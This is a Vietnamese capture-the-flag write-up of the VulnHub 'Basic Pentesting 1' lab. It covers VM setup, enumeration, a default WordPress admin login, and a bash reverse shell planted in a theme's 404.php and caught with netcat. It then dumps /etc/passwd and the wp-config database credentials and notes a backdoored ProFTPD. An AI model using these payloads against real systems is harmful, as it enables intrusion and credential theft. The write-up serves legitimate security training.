---
title: VulnHub - Basic Pentesting 1
date: 03-02-2025
category: lab
tags:
  - ctf
  - pentest
  - php
  - rce
  - wordpress
---

# Mục tiêu

Tấn công từ xa vào VM và giành được quyền root. Cố gắng thử với nhiều hướng tấn công nhất có thể!

# Setup
Ở đây tôi sử dụng Kali Linux luôn, tương tự với Ubuntu hay Debian. Tuy nhiên với Windows thì sẽ có đôi chút khác biệt khi setup.
- Trước tiên là cập nhật lại với vài câu lệnh quen thuộc:
```bash
sudo apt update && sudo apt upgrade -f
```
- Sau khi xong thì ta tiến hành cài `virtualbox` và `linux-headers-generic`
```bash
sudo apt update

sudo apt install virtualbox linux-headers-generic
```
- Cuối cùng là thêm tí extension pack:
```bash
sudo apt install virtualbox-ext-pack
```
- Giờ thì để mở virtualbox bằng CLI hay GUI là tùy bạn miễn là nó lên kiểu như này là được:
![virtualbox](/basic-pentesting-1/basic-pentesting-1.png)
- Tiếp theo ta tải về file lab, link thì [tại đây](https://www.vulnhub.com/entry/basic-pentesting-1,216/) (không hiểu sao cái link chính của VulnHub lúc nào cũng chết :V )
- Sau khi mọi người tải xong thì mở virtualbox và chọn `Import`:
![alt text](/basic-pentesting-1/basic-pentesting-1-1.png)
- Tìm và chọn cái file .ova vừa tải về rồi cứ next với finish cho xong. Sau đó đợi 1 lúc cho file load.
![alt text](/basic-pentesting-1/basic-pentesting-1-2.png)
- Ta cài lại 1 chút như sau bằng cách chọn `Settings`:
    + Làm như sau để setup network `File -> Tools -> Network Manager -> Create`. Đến đây đảm bảo bật `Configure Adapter Manually`, khi này cái IPv4 sẽ là của máy IPv4 gán cho máy bạn (tức Kali Linux). Sang tab `DHCP Server` và đảm bảo nó cũng bật. Ở phần này thì có `Lower Address Bound` và `Upper Address Bound` sẽ là khoảng IPv4 mà các máy lab sẽ được gán (ở đây là máy lab mà bạn vừa tài về ấy).
    ![alt text](/basic-pentesting-1/basic-pentesting-1-3.png)
    ![alt text](/basic-pentesting-1/basic-pentesting-1-4.png)
    + Phần `Network` nếu chưa chọn thì chọn lại:
    ![alt text](/basic-pentesting-1/basic-pentesting-1-5.png)
    + Phần `Display` thì sửa lại phần `Graphics Controller` là `VMSVGA`.
    ![alt text](/basic-pentesting-1/basic-pentesting-1-6.png)
- Sau khi xong các bước trên thì thì `Start`, nhìn nó ra như này thì có vẻ là ổn:
![alt text](/basic-pentesting-1/basic-pentesting-1-7.png)
- Check lại bằng `ifconfig` ở máy Kali Linux:
![alt text](/basic-pentesting-1/basic-pentesting-1-8.png)
- Bây giờ vận dụng chút Nmap để tìm IP của máy lab:
![alt text](/basic-pentesting-1/basic-pentesting-1-9.png)
- Quay đấy thì ta thấy máy lab ở `192.168.56.102` và có cổng 80 đang mở, thử mở browser lên xem sao:
![alt text](/basic-pentesting-1/basic-pentesting-1-10.png)
- Như vậy là ta đã xong phần setup ròi.
# Reconnaissance & Enumeration
## Scan
```bash
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
|   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
|_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
```
Ta kiem tra cong 80
## Dirsearch
```bash
[11:02:27] 403 -  292B  - /.ht_wsr.txt
[11:02:27] 403 -  295B  - /.htaccess.bak1
[11:02:27] 403 -  297B  - /.htaccess.sample
[11:02:27] 403 -  295B  - /.htaccess.save
[11:02:27] 403 -  296B  - /.htaccess_extra
[11:02:27] 403 -  293B  - /.htaccess_sc
[11:02:27] 403 -  295B  - /.htaccess_orig
[11:02:27] 403 -  293B  - /.htaccessBAK
[11:02:27] 403 -  294B  - /.htaccessOLD2
[11:02:27] 403 -  295B  - /.htaccess.orig
[11:02:27] 403 -  293B  - /.htaccessOLD
[11:02:27] 403 -  286B  - /.html
[11:02:27] 403 -  285B  - /.htm
[11:02:27] 403 -  295B  - /.htpasswd_test
[11:02:27] 403 -  291B  - /.htpasswds
[11:02:27] 403 -  292B  - /.httr-oauth
[11:02:27] 403 -  285B  - /.php
[11:02:27] 403 -  286B  - /.php3
[11:02:44] 301 -  301B  - /secret  ->  http://vtcsec/secret/
[11:02:44] 200 -   18KB - /secret/
[11:02:44] 403 -  294B  - /server-status
[11:02:44] 403 -  295B  - /server-status/
```
Ta thu tim hieu xem `/secret` la gi:
![[Pasted image 20250308110439.png]]
No la mot website, thu tiep tuc `dirsearch`:
```bash
[11:06:04] Starting: secret/
[11:06:05] 403 -  299B  - /secret/.ht_wsr.txt
[11:06:05] 403 -  302B  - /secret/.htaccess.bak1
[11:06:05] 403 -  302B  - /secret/.htaccess.orig
[11:06:05] 403 -  304B  - /secret/.htaccess.sample
[11:06:05] 403 -  303B  - /secret/.htaccess_extra
[11:06:05] 403 -  300B  - /secret/.htaccessBAK
[11:06:05] 403 -  302B  - /secret/.htaccess_orig
[11:06:05] 403 -  302B  - /secret/.htaccess.save
[11:06:05] 403 -  300B  - /secret/.htaccessOLD
[11:06:05] 403 -  301B  - /secret/.htaccessOLD2
[11:06:05] 403 -  300B  - /secret/.htaccess_sc
[11:06:05] 403 -  292B  - /secret/.htm
[11:06:05] 403 -  293B  - /secret/.html
[11:06:05] 403 -  298B  - /secret/.htpasswds
[11:06:05] 403 -  302B  - /secret/.htpasswd_test
[11:06:05] 403 -  299B  - /secret/.httr-oauth
[11:06:05] 403 -  293B  - /secret/.php3
[11:06:05] 403 -  292B  - /secret/.php
[11:06:17] 301 -    0B  - /secret/index.php  ->  http://vtcsec/secret/
[11:06:17] 404 -   49KB - /secret/index.php/login/
[11:06:18] 200 -    7KB - /secret/license.txt
[11:06:24] 200 -    3KB - /secret/readme.html
[11:06:30] 301 -  310B  - /secret/wp-admin  ->  http://vtcsec/secret/wp-admin/
[11:06:30] 500 -    3KB - /secret/wp-admin/setup-config.php
[11:06:30] 302 -    0B  - /secret/wp-admin/  ->  http://vtcsec/secret/wp-login.php?redirect_to=http%3A%2F%2Fvtcsec%2Fsecret%2Fwp-admin%2F&reauth=1
[11:06:30] 400 -    1B  - /secret/wp-admin/admin-ajax.php
[11:06:30] 200 -    0B  - /secret/wp-config.php
[11:06:30] 200 -  530B  - /secret/wp-admin/install.php
[11:06:30] 200 -    0B  - /secret/wp-content/
[11:06:30] 301 -  312B  - /secret/wp-content  ->  http://vtcsec/secret/wp-content/
[11:06:30] 200 -   84B  - /secret/wp-content/plugins/akismet/akismet.php
[11:06:30] 500 -    0B  - /secret/wp-content/plugins/hello.php
[11:06:30] 200 -  454B  - /secret/wp-content/uploads/
[11:06:30] 200 -    0B  - /secret/wp-cron.php
[11:06:30] 301 -  313B  - /secret/wp-includes  ->  http://vtcsec/secret/wp-includes/
[11:06:30] 500 -    0B  - /secret/wp-includes/rss-functions.php
[11:06:31] 302 -    0B  - /secret/wp-signup.php  ->  http://vtcsec/secret/wp-login.php?action=register
[11:06:31] 200 -    1KB - /secret/wp-login.php
[11:06:32] 405 -   42B  - /secret/xmlrpc.php
[11:06:35] 200 -    4KB - /secret/wp-includes/
```
-> Day la web su dung `WordPress`
# Exploitation
## WordPress (80)
Ta thu kiem tra `/wp-login`:
![[Pasted image 20250308111051.png]]
Thu credential `admin:admin`
![[Pasted image 20250308111137.png]]
Ta da co quyen `admin` voi  website nay
Khi co quyen admin voi wordpress, ban co the co ti cach de lay dc `RCE`, trong do ta co the chinh sua file php cua cac plugin hoac theme.
O day ta se su dung theme, ta sua tai `/wp-admin/theme-editor.php`:
![[Pasted image 20250308112412.png]]
De de cho exec ta se sua 404.php
![[Pasted image 20250308112457.png]]
Gio thi de exec `404.php`, ta se su dung URL: `/wp-content/themes/[ten theme]/404.php`
```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.1/8000 0>&1'");
```

```bash
nc -lnvp 8000
```
Ket qua:
```bash
┌──(t6d㉿t6d)-[~]
└─$ nc -nlvp 8000
listening on [any] 8000 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.102] 47338
bash: cannot set terminal process group (1212): Inappropriate ioctl for device
bash: no job control in this shell
www-data@vtcsec:/var/www/html/secret/wp-content/themes/twentyseventeen$ ls
ls
404.php
README.txt
archive.php
assets
comments.php
cropped-DGMYOGRtKc.jpg
cropped-bTebJPoYLc.jpg
cropped-vZNtpxHXPE.jpg
cropped-wigkTuSPSp.jpg
footer.php
front-page.php
functions.php
header.php
inc
index.php
page.php
rtl.css
screenshot.png
search.php
searchform.php
sidebar.php
single.php
style.css
template-parts
www-data@vtcsec:/var/www/html/secret/wp-content/themes/twentyseventeen$ whoami
<ml/secret/wp-content/themes/twentyseventeen$ whoami                         
www-data
```
Ta su dung `TTY Spawn Shell` de tien cho su dung:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116
```
Ta setup thanh cong
# Post - Exploitation
## Enumeration

```bash
www-data@vtcsec:/var/www/html/secret/wp-content/themes/twentyseventeen$ whoami
www-data
www-data@vtcsec:/var/www/html/secret/wp-content/themes/twentyseventeen$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@vtcsec:/var/www/html/secret/wp-content/themes/twentyseventeen$ sudo -l
[sudo] password for www-data: 
```

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
marlinspike:x:1000:1000:marlinspike,,,:/home/marlinspike:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
```
Ta doc duoc them MySQL credential
```bash
define('DB_NAME', 'wp_myblog');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'arootmysqlpass');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```
Tiec la ta ko the su dung `mysql`:
```bash
www-data@vtcsec:/home/marlinspike/wordpress$ mysql
ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: NO)
```
Truy cap thu `/home/marlinspike`:
```bash
www-data@vtcsec:/home/marlinspike$ ls -la
total 27336
drwxr-xr-x 22 marlinspike marlinspike    4096 Nov 17  2017 .
drwxr-xr-x  3 root        root           4096 Nov 14  2017 ..
-rw-------  1 marlinspike marlinspike    2926 Nov 17  2017 .ICEauthority
-rw-------  1 marlinspike marlinspike     118 Nov 17  2017 .Xauthority
-rw-------  1 marlinspike marlinspike    4106 Nov 17  2017 .bash_history
-rw-r--r--  1 marlinspike marlinspike     220 Nov 14  2017 .bash_logout
-rw-r--r--  1 marlinspike marlinspike    3771 Nov 14  2017 .bashrc
drwx------ 11 marlinspike marlinspike    4096 Nov 16  2017 .cache
drwx------  3 marlinspike marlinspike    4096 Nov 17  2017 .compiz
drwx------ 14 marlinspike marlinspike    4096 Nov 14  2017 .config
-rw-r--r--  1 marlinspike marlinspike      25 Nov 14  2017 .dmrc
drwx------  2 marlinspike marlinspike    4096 Nov 17  2017 .gconf
drwx------  3 marlinspike marlinspike    4096 Nov 17  2017 .gnupg
drwx------  3 marlinspike marlinspike    4096 Nov 14  2017 .local
drwx------  4 marlinspike marlinspike    4096 Nov 16  2017 .mozilla
-rw-------  1 marlinspike marlinspike     216 Nov 16  2017 .mysql_history
drwxrwxr-x  2 marlinspike marlinspike    4096 Nov 16  2017 .nano
-rw-r--r--  1 marlinspike marlinspike     655 Nov 14  2017 .profile
drwx------  2 marlinspike marlinspike    4096 Nov 17  2017 .ssh
-rw-r--r--  1 marlinspike marlinspike       0 Nov 14  2017 .sudo_as_admin_successful
-rw-------  1 marlinspike marlinspike    1175 Nov 17  2017 .xsession-errors
-rw-------  1 marlinspike marlinspike    1171 Nov 17  2017 .xsession-errors.old
-rw-rw-r--  1 marlinspike marlinspike 4929934 Nov 17  2017 046e85f6fe460de94fd46198feef4d07-backdoored_proftpd-1.3.3c.tar.gz
-rw-rw-r--  1 marlinspike marlinspike 4929934 Nov 17  2017 046e85f6fe460de94fd46198feef4d07-backdoored_proftpd-1.3.3c.tar.gz.bak
drwxr-xr-x  2 marlinspike marlinspike    4096 Nov 14  2017 Desktop
drwxr-xr-x  2 marlinspike marlinspike    4096 Nov 14  2017 Documents
drwxr-xr-x  2 marlinspike marlinspike    4096 Nov 17  2017 Downloads
drwxr-xr-x  2 marlinspike marlinspike    4096 Nov 14  2017 Music
drwxr-xr-x  2 marlinspike marlinspike    4096 Nov 14  2017 Pictures
drwxr-xr-x  2 marlinspike marlinspike    4096 Nov 14  2017 Public
drwxr-xr-x  2 marlinspike marlinspike    4096 Nov 14  2017 Templates
drwxr-xr-x  2 marlinspike marlinspike    4096 Nov 14  2017 Videos
drwxr-xr-x 14 marlinspike marlinspike    4096 Nov 17  2017 backdoored_proftpd-1.3.3c
-rw-r--r--  1 marlinspike marlinspike    8980 Nov 14  2017 examples.desktop
-rw-rw-r--  1 marlinspike marlinspike 9638753 Nov 15  2017 latest.tar.gz
drwxr-xr-x 14 marlinspike marlinspike    4096 Nov 16  2017 proftpd-1.3.3c
-rw-rw-r--  1 marlinspike marlinspike 4166609 Nov 16  2017 proftpd-1.3.3c.tar.bz2
-rw-rw-r--  1 marlinspike marlinspike 4166609 Nov 16  2017 proftpd-1.3.3c.tar.bz2.bak
drwxr-xr-x  5 marlinspike marlinspike    4096 Nov 15  2017 wordpress
```
Tat tat nhien se thay `046e85f6fe460de94fd46198feef4d07-backdoored_proftpd-1.3.3c.tar.gz`. Ta thu tim hieu va ...
![[Pasted image 20250308115753.png]]
Bruhh mat nua ngay de dung cach `Wordpress`:
Dung voi `msfconsole`, ta co quyen `root`:
![[Pasted image 20250308115916.png]]
